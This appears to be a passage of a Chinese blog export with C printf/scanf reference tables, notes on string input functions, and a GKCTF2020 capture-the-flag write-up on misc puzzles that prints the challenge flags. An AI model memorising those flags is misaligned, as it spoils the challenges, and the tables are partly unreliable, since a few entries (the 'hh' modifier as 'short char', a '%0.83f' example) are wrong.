<td>根据值的不同，自动选择%f或%E，%E格式用于指数小于-4或者大于等于精度时</td>
</tr>
<tr>
<td>%i</td>
<td>有符号十进制整数（与%d相同）</td>
</tr>
<tr>
<td>%o</td>
<td>无符号八进制整数</td>
</tr>
<tr>
<td>%p</td>
<td>指针</td>
</tr>
<tr>
<td>%s</td>
<td>字符串</td>
</tr>
<tr>
<td>%u</td>
<td>无符号十进制整数</td>
</tr>
<tr>
<td>%x</td>
<td>无符号十六进制整数，使用十六进制数0f</td>
</tr>
<tr>
<td>%X</td>
<td>无符号十六进制整数，使用十六进制数0F</td>
</tr>
<tr>
<td>%%</td>
<td>打印一个百分号</td>
</tr>
</tbody>
</table>
</div>
<h1 id="printf-的修饰符"><a href="#printf-的修饰符" class="headerlink" title="printf()的修饰符"></a>printf()的修饰符</h1><div class="table-container">
<table>
<thead>
<tr>
<th>修饰符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>标记</td>
<td>标记表中描述了5种标记（-、+、空格、#和0），可以使用不同标记或使用多个标记 <br>示例：”%-10d”</td>
</tr>
<tr>
<td>数字</td>
<td>最小字段宽度 <br>如果该字段不能容纳待打印的数字或字符串，系统会使用更宽的字段 <br>示例：”%4d”</td>
</tr>
<tr>
<td>.数字</td>
<td>精度 <br>对于%e、%E和%f，表示小数点右边数字的位数 <br>对于%g和%G转换，表示有效数字最大位数 <br>对于%s转换，表示待打印字符的最大数量 <br>对于整数转换，表示待打印数字的最小位数 <br>如果有必要使用前导 0 来达到这个位数 <br>只使用，表示其后跟随一个0，所以%.f和%.0f相同 <br>示例：”%5.2f”打印一个浮点数，字段宽度为5，其中小数点后有两位数字</td>
</tr>
<tr>
<td>h</td>
<td>和整型转换说明一起使用 <br>表示 short int 或 unsigned short int类型的值 <br>示例：”%hu”, “%hx”, “%6.4hd”</td>
</tr>
<tr>
<td>hh</td>
<td>和整型转换说明一起使用 <br>表示 short char 或 unsigned char类型的值 <br>示例：”%hhu”, “%hhx”, “%6.4hhd”</td>
</tr>
<tr>
<td>j</td>
<td>和整型转换说明一起使用 <br>表示 intmax_t 或 uintmax_t 类型的值。这些类型定义在 stdint.h中 <br>示例：”%jd”, “%8jx”</td>
</tr>
<tr>
<td>l</td>
<td>和整型转换说明一起使用 <br>表示 long int 或 unsigned long int 类型的值 <br>示例：”%ld”, “%8lu”</td>
</tr>
<tr>
<td>ll</td>
<td>和整型转换说明一起使用 <br>表示 long  long int 或 unsigned long long int 类型的值(C99) <br>示例：”%lld”, “%8llu”</td>
</tr>
<tr>
<td>L</td>
<td>和浮点转换说明一起使用 <br>表示 long double 类型的值 <br>示例：”%Lf”, “%10.4Le”</td>
</tr>
<tr>
<td>t</td>
<td>和整型转换说明一起使用 <br>表示 ptrdiff_t 类型的值。ptrdiff_t是两个指针差值的类型(C99) <br>示例：”%td”, “%12ti”</td>
</tr>
<tr>
<td>z</td>
<td>和整型转换说明一起使用 <br>表示 size_t 类型的值。size_t 是 sizeof 返回的类型(C99) <br>示例：”%zd”, “%12zd”</td>
</tr>
</tbody>
</table>
</div>
<h1 id="printf-中的标记"><a href="#printf-中的标记" class="headerlink" title="printf()中的标记"></a>printf()中的标记</h1><div class="table-container">
<table>
<thead>
<tr>
<th>标记</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-</td>
<td>待打印项左对齐。即，从字段的左侧开始打印该项<br>示例：”%-20s”</td>
</tr>
<tr>
<td>+</td>
<td>有符号值若为正，则在之前显示加号；若为负，则显示减号<br>示例：”%+6.2f”</td>
</tr>
<tr>
<td>空格</td>
<td>有符号值若为正，则在之前不显示任何符号；若为负，则显示减号<br>示例：”% 6.2f”</td>
</tr>
<tr>
<td>#</td>
<td>把结果转换成另一种形式。<br>如果是%o格式，则以0开始；<br>如果是%x或%X格式，则以0x或0X开始；<br>对于所有的浮点数格式，#保证了即使后面没有任何数字，也打印一个小数点字符<br>对于%g或%G格式，#防止结果后面的0被删除<br>示例：”%#o”, “%#8.0f”, “%+#10.3e”</td>
</tr>
<tr>
<td>0</td>
<td>对于数值格式，用前导0代替空格。<br>对于整数格式，如果出现-标记或指定精度，则忽略该标记。<br>示例：”%010d”, “%0.83f”</td>
</tr>
</tbody>
</table>
</div>
<h1 id="scanf-的转换说明"><a href="#scanf-的转换说明" class="headerlink" title="scanf()的转换说明"></a>scanf()的转换说明</h1><div class="table-container">
<table>
<thead>
<tr>
<th>转换说明</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>%c</td>
<td>把输入解释成字符</td>
</tr>
<tr>
<td>%d</td>
<td>把输入解释成有符号十进制整数</td>
</tr>
<tr>
<td>%e、%f、%g、%a</td>
<td>把输入解释成浮点数（C99标准新增了%a）</td>
</tr>
<tr>
<td>%E、%F、%G、%A</td>
<td>把输入解释成浮点数（C99标准新增了%A）</td>
</tr>
<tr>
<td>%i</td>
<td>把输入解释成有符号十进制整数</td>
</tr>
<tr>
<td>%o</td>
<td>把输入解释成有符号八进制整数</td>
</tr>
<tr>
<td>%p</td>
<td>把输入解释成指针（地址）</td>
</tr>
<tr>
<td>%s</td>
<td>把输入解释成字符串。<br>从第1个非空白字符开始，到下一个空白字符之前的所有字符都是输入</td>
</tr>
<tr>
<td>%u</td>
<td>把输入解释成无符号十进制整数</td>
</tr>
<tr>
<td>%x、%X</td>
<td>把输入解释成有符号十六进制整数</td>
</tr>
</tbody>
</table>
</div>
<h1 id="scanf-转换说明中的修饰符"><a href="#scanf-转换说明中的修饰符" class="headerlink" title="scanf()转换说明中的修饰符"></a>scanf()转换说明中的修饰符</h1><div class="table-container">
<table>
<thead>
<tr>
<th>转换说明</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>抑制赋值<br>示例：”%*d”</td>
</tr>
<tr>
<td>数字</td>
<td>最大字段宽度。输入达到最大字段宽度处，或第1次遇到空白字符时停止<br>示例：”%10s”</td>
</tr>
<tr>
<td>hh</td>
<td>把整数作为 signed char 或 unsigned char 类型读取<br>示例：”%hhd”, “%hhu”</td>
</tr>
<tr>
<td>ll</td>
<td>把整数作为 long long 或 unsigned long long 类型读取<br>示例：”%lld”, “%llu”</td>
</tr>
<tr>
<td>h、l 或 L</td>
<td>“%hd”和”%hi”表明把对应的值储存为 short int 类型<br>“%ho”、”%hx”和”%hu”表明把对应的值储存为 unsigned short int 类型<br>“%ld”和”%li”表明把对应的值储存为 long 类型<br>“%lo”、”%lx”和”%lu”表明把对应的值储存为 unsigned long int 类型<br>“%le”、”%lf”和”%lg”表明把对应的值储存为 double 类型<br>在e、f、g前面使用L时，表明把对应的值储存为 long double 类型<br>如果没有修饰符，d、i、o、x，表明把对应的值被储存为int类型<br>f、g表明把对应的值被储存为float类型</td>
</tr>
<tr>
<td>j</td>
<td>在整型转换说明后面时 <br>表明使用 intmax_t 或 uintmax_t 类型(C99) <br>示例：”%jd”, “%ju”</td>
</tr>
<tr>
<td>z</td>
<td>在整型转换说明后面时 <br>表明使用sizeof 的返回类型(C99) <br>示例：”%zd”, “%zo”</td>
</tr>
<tr>
<td>t</td>
<td>在整型转换说明后面时 <br>表明使用表示两个指针差值的类型(C99) <br>示例：”%td”, “%tx”</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C字符串输入输出</title>
    <url>/2020/11/16/c-zi-fu-chuan-shu-ru-shu-chu/</url>
    <content><![CDATA[<p><strong>如果想把一个字符串读入程序，首先必须预留储存该字符串的空间，然后用输入函数获取该字符串。</strong></p>
<span id="more"></span>
<h1 id="gets-函数和puts-函数"><a href="#gets-函数和puts-函数" class="headerlink" title="gets()函数和puts()函数"></a>gets()函数和puts()函数</h1><p>gets()函数读取整行输入，直至遇到换行符，然后丢弃换行符，存储其余字符，并在这些字符末尾添加一个空字符，使其成为一个C字符串。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">gets</span><span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>str <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>puts()函数显示字符串，并在末尾添加换行符，成功返回非负值，失败返回EOF。puts(words)相当于printf(“%s\n”,words)</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
  <span class="token keyword">int</span> <span class="token function">puts</span><span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>str <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1 id="fgets-函数和fputs-函数"><a href="#fgets-函数和fputs-函数" class="headerlink" title="fgets()函数和fputs()函数"></a>fgets()函数和fputs()函数</h1><p>该函数专门用于处理文件输入。</p>
<p>fgets()函数的第2个参数指明了读入字符的最大数量。如果该参数是n，那么fgets()读入n-1个字符，或者遇到第一个换行符为止。如果fgets()函数读到一个换行符，会把换行符存储在字符串中（和gets()区别）。</p>
<p>fgets()函数的第3个参数指明要读入的文件。如果是从键盘输入，将stdin（标准输入）作为参数。</p>
<p>fgets()函数返回指向char的指针。如果正常读入，返回的地址和传入的第1个参数相同。如果读入异常，返回空指针（C语言中用宏NULL来表示）</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">fgets</span><span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>fputs()函数，它不会在末尾添加换行符。如果是从屏幕输入，将stdout（标准输出）作为参数。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
  <span class="token keyword">int</span> <span class="token function">fputs</span><span class="token punctuation">(</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1 id="gets-s-函数"><a href="#gets-s-函数" class="headerlink" title="gets_s()函数"></a>gets_s()函数</h1><p>gets_s()只从标准输入中读取数据，所以不需要第三个参数。并且gets_s()读到换行符会丢弃它而不是存储它。</p>
<p>如果gets_s()读到最大字符数都没有读到换行符，会执行以下几步。首先把目标数组中的首字符设置为空字符，读取并丢弃随后的输入直至读到换行符或者文件结尾，然后返回空指针。接着，调用依赖实现的“处理函数”，可能会中止或退出程序。</p>
<p>以上的特性说明，只要输入行未超过最大字符数，gets_s()和gets()几乎一模一样，完全可以替换！</p>
<h1 id="scanf-函数和printf-函数"><a href="#scanf-函数和printf-函数" class="headerlink" title="scanf()函数和printf()函数"></a>scanf()函数和printf()函数</h1><p>scanf()有两种方法确定输入结束：%5s，读取5个字符或者读到第一个空白停止。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>输入语句</th>
<th>原输入序列</th>
<th>name中的内容</th>
<th>剩余输入序列</th>
</tr>
</thead>
<tbody>
<tr>
<td>scanf(“%s”,name);</td>
<td>Fleebert▢Hup</td>
<td>Fleebert</td>
<td>▢Hup</td>
</tr>
<tr>
<td>scanf(“%5s”,name);</td>
<td>Fleebert▢Hup</td>
<td>Fleeb</td>
<td>bert▢Hup</td>
</tr>
<tr>
<td>scanf(“%5s”,name);</td>
<td>Ann▢Ular</td>
<td>Ann</td>
<td>▢Ular</td>
</tr>
</tbody>
</table>
</div>
<p>注：▢表示空格</p>
<p>printf()函数主要是使用其格式化功能。</p>
<h1 id="自定义输入输出函数"><a href="#自定义输入输出函数" class="headerlink" title="自定义输入输出函数"></a>自定义输入输出函数</h1><p>不一定非要使用C库中的标准函数，如果无法使用这些函数或不想使用它们，完全可以在getchar()和putchar()的基础上自定义所需的函数。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言获取一行输入</title>
    <url>/2020/11/20/c-yu-yan-huo-qu-yi-xing-shu-ru/</url>
    <content><![CDATA[<p>最近在重新学习C语言时，发现scanf()函数使用%s或%c获取一行输入时会在空格处截断，在网上查了些资料后找到了几个解决办法</p>
<span id="more"></span>
<ol>
<li><p>scanf()函数</p>
<p>原型</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> restrict format<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>用法</p>
<p>scanf()函数使用在获取输入的时候会在空格处截断，使用</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%[^\n]"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>即可获取一行输入</p>
</li>
<li><p>gets()函数</p>
<p>原型</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">gets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>用法</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">gets</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>gets()函数也可以获取一行内容</p>
<p><strong>gets()函数从标准输入读入一行文本，直到读到新行符或EOF字符之前，不会停止读入文本。</strong></p>
<p><strong>也就是：gets()不检查边界。因此，当变量空间小于一行字符串时，使用gets()会造成溢出，程序出错。</strong></p>
<p>所以应少用或不使用此函数</p>
</li>
<li><p>gets_s()函数</p>
<p>原型</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">gets_s</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> sizeInCharacters<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>用法</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">gets_s</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>gets_s()函数用法与gets()函数基本一致，但多了一个参数，使得程序更加安全</p>
</li>
<li><p>fgets()函数</p>
<p>原型</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>用法</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> SIZE<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>fgets() 虽然比 gets() 安全，但安全是要付出代价的，代价就是它的使用比 gets() 要麻烦一点，有三个参数。它的功能是从 stream 流中读取 size 个字符存储到字符指针变量 s 所指向的内存空间。它的返回值是一个指针，指向字符串中第一个字符的地址。</p>
</li>
<li><p>自定义</p>
<p>详见《C Primer Plus （中文版）第6版》P331-P334</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">s_gets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>st<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>ret_val<span class="token punctuation">;</span>
	<span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	
	ret_val <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span>st<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>ret_val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//与*ret_val!='\0'相同，当ret_val指向空字符时，ret_val的值是0，即测试条件为假，while循环结束</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span>st<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'\n'</span> <span class="token operator">&amp;&amp;</span> st<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">)</span>
                i<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>st<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
                st<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>  <span class="token comment">//如果检测到结束标志'\0'，则读取但不储存输入，包括\n。  </span>
                  <span class="token comment">//丢弃的目的，不让多出来的留在缓冲区，保证了读取语句与键盘输入同步   </span>
                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> ret_val<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2020wp</title>
    <url>/2020/06/03/gkctf2020wp/</url>
    <content><![CDATA[<p>题目还算比较简单吧</p>
<span id="more"></span>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Pokémon"><a href="#Pokémon" class="headerlink" title="Pokémon"></a>Pokémon</h2><p>找个GBA模拟器玩游戏，到103街道，发现flag</p>
<p><code>flag&#123;PokEmon_14_CutE&#125;</code></p>
<h2 id="code-obfuscation"><a href="#code-obfuscation" class="headerlink" title="code obfuscation"></a>code obfuscation</h2><p>给了张二维码，扫描不了，直接手动复原：<a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p>
<p>扫描得到<code>base(gkctf)</code></p>
<p>然后base家族一个一个的试，最后发现是base58：CfjxaPF</p>
<p>解出一张图片和一段杂乱的js代码,<a href="https://tool.lu/js/">https://tool.lu/js/</a>美化并解密</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">for</span> n <span class="token keyword">in</span> a b c d e f g h i j k l m n o p q r s t u v w x y z <span class="token keyword">do</span> eval An <span class="token operator">=</span> <span class="token string">"n"</span>
done
<span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token constant">A</span> <span class="token constant">B</span> <span class="token constant">C</span> <span class="token constant">D</span> <span class="token constant">E</span> <span class="token constant">F</span> <span class="token constant">G</span> <span class="token constant">H</span> <span class="token constant">I</span> <span class="token constant">J</span> <span class="token constant">K</span> <span class="token constant">L</span> <span class="token constant">M</span> <span class="token constant">N</span> <span class="token constant">O</span> <span class="token constant">P</span> <span class="token constant">Q</span> <span class="token constant">R</span> <span class="token constant">S</span> <span class="token constant">T</span> <span class="token constant">U</span> <span class="token constant">V</span> <span class="token constant">W</span> <span class="token constant">X</span> <span class="token constant">Y</span> <span class="token constant">Z</span> <span class="token keyword">do</span> eval An <span class="token operator">=</span> <span class="token string">"n"</span>
done num <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> n <span class="token keyword">in</span> a b c d e f g h i j <span class="token keyword">do</span> eval Bn <span class="token operator">=</span> <span class="token string">"n"</span>
num <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
done <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Bk=' ';Bm='"</span><span class="token string">';Bn='</span>#<span class="token string">';Bs='</span><span class="token punctuation">(</span><span class="token string">';Bt='</span><span class="token punctuation">)</span><span class="token string">';By='</span><span class="token punctuation">.</span><span class="token string">';Cb='</span><span class="token string">';Cc='</span><span class="token operator">&lt;</span><span class="token string">';Ce='</span><span class="token operator">></span><span class="token string">';Cl='</span>_<span class="token string">';Cn='</span><span class="token punctuation">&#123;</span><span class="token string">';Cp='</span><span class="token punctuation">&#125;</span><span class="token string">';Da='</span><span class="token number">0</span><span class="token string">';Db='</span><span class="token number">1</span><span class="token string">';Dc='</span><span class="token number">2</span><span class="token string">';Dd='</span><span class="token number">3</span><span class="token string">';De='</span><span class="token number">4</span><span class="token string">';Df='</span><span class="token number">5</span><span class="token string">';Dg='</span><span class="token number">6</span><span class="token string">';Dh='</span><span class="token number">7</span><span class="token string">';Di='</span><span class="token number">8</span><span class="token string">';Dj='</span><span class="token number">9</span>'<span class="token punctuation">;</span>"<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>python脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
s <span class="token operator">=</span> <span class="token string">"$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp"</span>
ll <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">)</span>
list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Bk'</span><span class="token punctuation">,</span><span class="token string">'Bm'</span><span class="token punctuation">,</span><span class="token string">'Bn'</span><span class="token punctuation">,</span><span class="token string">'Bs'</span><span class="token punctuation">,</span><span class="token string">'Bt'</span><span class="token punctuation">,</span><span class="token string">'By'</span><span class="token punctuation">,</span><span class="token string">'Cb'</span><span class="token punctuation">,</span><span class="token string">'Cc'</span><span class="token punctuation">,</span><span class="token string">'Ce'</span><span class="token punctuation">,</span><span class="token string">'Cl'</span><span class="token punctuation">,</span><span class="token string">'Cn'</span><span class="token punctuation">,</span><span class="token string">'Cp'</span><span class="token punctuation">,</span><span class="token string">'Da'</span><span class="token punctuation">,</span><span class="token string">'Db'</span><span class="token punctuation">,</span><span class="token string">'Dc'</span><span class="token punctuation">,</span><span class="token string">'Dd'</span><span class="token punctuation">,</span><span class="token string">'De'</span><span class="token punctuation">,</span><span class="token string">'Df'</span><span class="token punctuation">,</span><span class="token string">'Dg'</span><span class="token punctuation">,</span><span class="token string">'Dh'</span><span class="token punctuation">,</span><span class="token string">'Di'</span><span class="token punctuation">,</span><span class="token string">'Dj'</span><span class="token punctuation">]</span>
list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">]</span>
list3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
list4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
s <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase
<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
	list3<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'A%s'</span><span class="token operator">%</span>i<span class="token punctuation">)</span>
	list4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment">#print(list3,'\n',list4)</span>

t <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">if</span> ll<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>list1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
			t <span class="token operator">+=</span> list2<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
	<span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">if</span> ll<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>list3<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">:</span>
			t <span class="token operator">+=</span>list4<span class="token punctuation">[</span>k<span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;int main()&#123;print(&quot;w3lc0me_4o_9kct5&quot;)return 0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>flag:<code>flag&#123;w3lc0me_4o_9kct5&#125;</code></p>
<h2 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a>Harley Quinn</h2><p>将音频后面的电话音剪出来，使用dtmf2num.exe识别</p>
<p>识别出：222833344477773338866</p>
